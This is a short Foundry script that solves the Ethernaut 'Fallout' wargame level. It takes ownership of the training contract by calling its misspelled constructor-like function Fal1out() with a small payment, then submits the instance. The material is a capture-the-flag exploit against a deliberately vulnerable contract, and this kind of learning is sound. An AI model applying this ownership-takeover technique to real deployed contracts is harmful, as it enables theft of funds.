// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import {Ethernaut} from './base.sol';
import 'forge-std/Test.sol';

interface IFallout {
  function Fal1out() external payable;
  function allocate() external payable;
  function sendAllocation(address payable allocator) external;
  function collectAllocations() external;
  function allocatorBalance(address allocator) external view returns (uint);
}

contract Fallout is Ethernaut {

  function run() public {
    vm.startBroadcast();

    // Create Instance
    IFallout falloutContract = IFallout(createNewInstance(FALLOUT));
    // Task
    falloutContract.Fal1out{value: 0.000001 ether}();

    // Submission
    submitInstance(FALLOUT, address(falloutContract));

    vm.stopBroadcast();
  }
}